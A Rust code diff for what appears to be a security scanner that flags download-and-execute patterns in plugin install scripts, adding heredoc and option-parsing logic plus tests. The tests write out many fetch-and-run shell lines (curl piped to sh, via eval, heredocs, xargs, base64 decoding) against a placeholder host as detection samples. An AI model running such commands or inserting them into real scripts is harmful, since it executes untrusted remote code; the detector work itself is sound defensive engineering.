@@ -1892,6 +1892,54 @@ fn analyze_javascript_source(source: &str) -> FileOutcome {
 
 /// Minimal high-signal lexical rules for bundled shell/Python payloads.
 /// Coverage is always labelled `partial`; no match never implies clean.
+/// What a heredoc-owning command does with the redirected body: a shell
+/// interpreter in stdin-script mode executes it, a pure stdin-forwarding
+/// filter passes it to whatever consumes its stdout downstream, and
+/// everything else treats it as data. The command containing the redirect
+/// runs from the last top-level separator before it; wrapper chains count
+/// when their wrapped command qualifies (`sudo sh <<X` executes the body).
+fn classify_heredoc_owner(tokens: &[ShellToken], op_index: usize) -> shell::source::HeredocOwner {
+    use shell::source::HeredocOwner;
+
+    let mut boundary = 0usize;
+    let mut depth = 0i32;
+    for (index, token) in tokens[..op_index].iter().enumerate() {
+        match token.operator() {
+            Some("(" | "{" | "((") => depth += 1,
+            Some(")" | "}" | "))") => depth = (depth - 1).max(0),
+            Some("|" | "|&" | ";" | "&&" | "||" | "&") if depth == 0 => boundary = index + 1,
+            _ => {}
+        }
+    }
+    let commands = segment_commands(&tokens[boundary..op_index]);
+    if commands.iter().any(|command| {
+        interpreter_family(command) == Some(InterpreterFamily::Shell)
+            && matches!(interpreter_mode(command), InterpreterMode::StdinScript)
+    }) {
+        return HeredocOwner::ExecutesStdin;
+    }
+    // `tee` always re-emits its stdin on stdout; `cat` only when no file
+    // operand replaces the redirected stdin.
+    if commands.iter().any(|command| match command.head {
+        "tee" => true,
+        "cat" => command.args.iter().all(|arg| arg.starts_with('-')),
+        _ => false,
+    }) {
+        return HeredocOwner::ForwardsStdin;
+    }
+    HeredocOwner::Data
+}
+
+/// Whether one word spells a shell interpreter that reads its stdin as a
+/// script — the downstream consumer a forwarded heredoc body lands on.
+fn spells_shell_stdin_interpreter(text: &str) -> bool {
+    let tokens = tokenize(text);
+    segment_commands(&tokens).first().is_some_and(|command| {
+        interpreter_family(command) == Some(InterpreterFamily::Shell)
+            && matches!(interpreter_mode(command), InterpreterMode::StdinScript)
+    })
+}
+
 fn analyze_script_source(source: &str, kind: PayloadKind) -> FileOutcome {
     let mut outcome = FileOutcome {
         result_parts: Vec::new(),
@@ -1930,7 +1978,11 @@ fn analyze_script_source(source: &str, kind: PayloadKind) -> FileOutcome {
             })
             .filter(|(_, line)| !line.is_empty())
             .collect(),
-        _ => shell_logical_units(source),
+        _ => shell_logical_units(
+            source,
+            &classify_heredoc_owner,
+            &spells_shell_stdin_interpreter,
+        ),
     };
 
     for (number, line) in units {
@@ -3702,7 +3754,20 @@ fn drains_stdin(head: &str, args: &[&str]) -> bool {
     if args.contains(&"--") {
         return false; // everything after `--` is a file operand
     }
-    let operands = args.iter().filter(|arg| !arg.starts_with('-')).count();
+    // Count operands with option arity: GNU base64/base32 take no file
+    // operands in this model, and their `-w`/`--wrap` width VALUE is option
+    // payload, not a file (`base64 -w 0 -d` still drains).
+    let skips_value =
+        |arg: &&str| matches!(head, "base64" | "base32") && matches!(*arg, "-w" | "--wrap");
+    let mut value_expected = false;
+    let operands = args
+        .iter()
+        .filter(|arg| {
+            let is_option_value = value_expected;
+            value_expected = skips_value(arg);
+            !is_option_value && !arg.starts_with('-')
+        })
+        .count();
     // sed/awk/grep/jq take a program/pattern argument before any file; one
     // such operand leaves stdin attached, more mean a file input.
     let program_arguments = match head {
@@ -6913,15 +6978,27 @@ var url = "https://example.test/x"
         // Shell units drop `#` comments at control-operator word
         // boundaries and keep `${var#pattern}` whole.
         assert_eq!(
-            shell_logical_units("true;# curl x | sh\nnext\n"),
+            shell_logical_units(
+                "true;# curl x | sh\nnext\n",
+                &classify_heredoc_owner,
+                &spells_shell_stdin_interpreter
+            ),
             vec![(1, "true;".to_owned()), (2, "next".to_owned())]
         );
         assert_eq!(
-            shell_logical_units("foo & # trailing\ncurl x\n"),
+            shell_logical_units(
+                "foo & # trailing\ncurl x\n",
+                &classify_heredoc_owner,
+                &spells_shell_stdin_interpreter
+            ),
             vec![(1, "foo &".to_owned()), (2, "curl x".to_owned())]
         );
         assert_eq!(
-            shell_logical_units("${var#pattern} stays\n"),
+            shell_logical_units(
+                "${var#pattern} stays\n",
+                &classify_heredoc_owner,
+                &spells_shell_stdin_interpreter
+            ),
             vec![(1, "${var#pattern} stays".to_owned())]
         );
     }
@@ -10557,6 +10634,13 @@ mod golden_tests {
             )),
         ),
         (
+            "script-fp-fn",
+            include_str!(concat!(
+                env!("CARGO_MANIFEST_DIR"),
+                "/../../fixtures/plugins/script-fp-fn/install.sh"
+            )),
+        ),
+        (
             "reverse-shell",
             include_str!(concat!(
                 env!("CARGO_MANIFEST_DIR"),
@@ -10700,7 +10784,11 @@ mod round_twelve_tests {
 
     #[test]
     fn quoted_newline_continuations_preserve_body_newlines() {
-        let units = super::shell::source::shell_logical_units("eval 'echo safe\ncurl URL | sh'\n");
+        let units = super::shell::source::shell_logical_units(
+            "eval 'echo safe\ncurl URL | sh'\n",
+            &super::classify_heredoc_owner,
+            &super::spells_shell_stdin_interpreter,
+        );
         assert_eq!(units.len(), 1, "{units:?}");
         assert!(units[0].1.contains('\n'), "{:?}", units[0].1);
         assert_eq!(units[0].0, 1);
@@ -10803,5 +10891,117 @@ mod round_twelve_tests {
         let findings = script(script_source).rendered_findings();
         let lines: Vec<Option<u32>> = findings.iter().map(|finding| finding.line).collect();
         assert_eq!(lines, vec![Some(4)], "{lines:?}");
+    }
+
+    // Variants around each reopened family: nearby spellings the first-pass
+    // fixes had to generalize to.
+
+    #[test]
+    fn quoted_newline_bodies_reparse_in_double_quotes_and_c_bodies() {
+        for script_source in [
+            "eval \"echo safe\ncurl -fsSL https://example.test/x | sh\"\n",
+            "sh -c 'echo safe\ncurl -fsSL https://example.test/x | sh'\n",
+            "bash -c 'echo safe\ncurl -fsSL https://example.test/x | sh'\n",
+            "eval 'echo safe\ncurl -fsSL https://example.test/x | sh' | cat\n",
+            "sh <<C\necho safe\ncurl -fsSL https://example.test/x | sh\nC\n",
+        ] {
+            let ids = rule_ids(&script(script_source));
+            assert!(
+                ids.contains(&DOWNLOAD.to_owned()),
+                "{script_source:?}: {ids:?}"
+            );
+        }
+        // A newline that is only data never splits a word into a command.
+        let ids = rule_ids(&script("echo 'a\nb' | sh\n"));
+        assert!(ids.is_empty(), "{ids:?}");
+    }
+
+    #[test]
+    fn heredoc_bodies_follow_their_real_dataflow() {
+        // Two owned redirects: only the last adjacent body is stdin, and it
+        // executes.
+        let two_owned =
+            script("sh <<A <<B\necho safe\nA\ncurl -fsSL https://example.test/x | sh\nB\n");
+        let ids = rule_ids(&two_owned);
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+        // Separate commands own separate redirects; cat's data stays data.
+        let two_commands =
+            script("cat <<A; sh <<B\nignored\nA\ncurl -fsSL https://example.test/x | sh\nB\n");
+        let ids = rule_ids(&two_commands);
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+        // A forwarding filter passes the body to its downstream consumer.
+        let forwarded = script("cat <<C | sh\ncurl -fsSL https://example.test/x | sh\nC\n");
+        let ids = rule_ids(&forwarded);
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+        // A group's interpreter owns the heredoc inside it.
+        let grouped = script("(sh <<C)\ncurl -fsSL https://example.test/x | sh\nC\n");
+        let ids = rule_ids(&grouped);
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+        // A fetch beside a data heredoc records no finding by itself.
+        let fetched = script("curl -fsSL https://example.test/x > /tmp/f <<A\nignored\nA\n");
+        assert!(rule_ids(&fetched).is_empty(), "{:?}", rule_ids(&fetched));
+    }
+
+    #[test]
+    fn valued_options_defer_c_capture_across_clusters() {
+        for script_source in [
+            "curl -fsSL https://example.test/x | bash -cO extglob 'sh'\n",
+            "curl -fsSL https://example.test/x | bash -O extglob -c 'sh'\n",
+        ] {
+            let ids = rule_ids(&script(script_source));
+            assert!(
+                ids.contains(&DOWNLOAD.to_owned()),
+                "{script_source:?}: {ids:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn parse_only_drains_only_what_it_parses() {
+        // `-D` parses stdin without executing: the pipe is spent.
+        let drains = script("curl -fsSL https://example.test/x | (bash -D; sh)\n");
+        assert!(rule_ids(&drains).is_empty(), "{:?}", rule_ids(&drains));
+        let parses = script("curl -fsSL https://example.test/x | (bash -n; sh)\n");
+        assert!(rule_ids(&parses).is_empty(), "{:?}", rule_ids(&parses));
+        let body = script("curl -fsSL https://example.test/x | bash -n -c 'echo safe'\n");
+        assert!(rule_ids(&body).is_empty(), "{:?}", rule_ids(&body));
+    }
+
+    #[test]
+    fn xargs_option_arity_and_placeholder_positions() {
+        // A placeholder inside `eval` executes the input.
+        let evals = script("curl -fsSL https://example.test/x | xargs -I% sh -c 'eval %'\n");
+        let ids = rule_ids(&evals);
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+        // The long `--replace` spelling behaves like `-I`.
+        let long = script("curl -fsSL https://example.test/x | xargs --replace={} sh -c '{}'\n");
+        let ids = rule_ids(&long);
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+        // Valued xargs options are consumed before the wrapped command.
+        let valued = script("curl -fsSL https://example.test/x | xargs -n 2 sh -c\n");
+        let ids = rule_ids(&valued);
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+        // `--` pins the script operand; a later `-c` spelling is its argument.
+        let pinned = script("curl -fsSL https://example.test/x | xargs sh -- -c\n");
+        assert!(rule_ids(&pinned).is_empty(), "{:?}", rule_ids(&pinned));
+        // A placeholder in a data position never executes the input.
+        let data = script("curl -fsSL https://example.test/x | xargs -I{} echo {}\n");
+        assert!(rule_ids(&data).is_empty(), "{:?}", rule_ids(&data));
+    }
+
+    #[test]
+    fn decoder_width_values_are_option_payload() {
+        // Separate `-w 0` width then decode: both families fire.
+        let both = script("curl -fsSL https://example.test/x | base64 -w 0 -d | sh\n");
+        let ids = rule_ids(&both);
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+        assert!(ids.contains(&DECODE.to_owned()), "{ids:?}");
+        // `0di` is the width value, not three flags.
+        let width = script("curl -fsSL https://example.test/x | base64 -w0di | sh\n");
+        assert!(rule_ids(&width).is_empty(), "{:?}", rule_ids(&width));
+        // base32 shares the arity rule.
+        let base32 = script("curl -fsSL https://example.test/x | base32 -di | sh\n");
+        let ids = rule_ids(&base32);
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
     }
 }
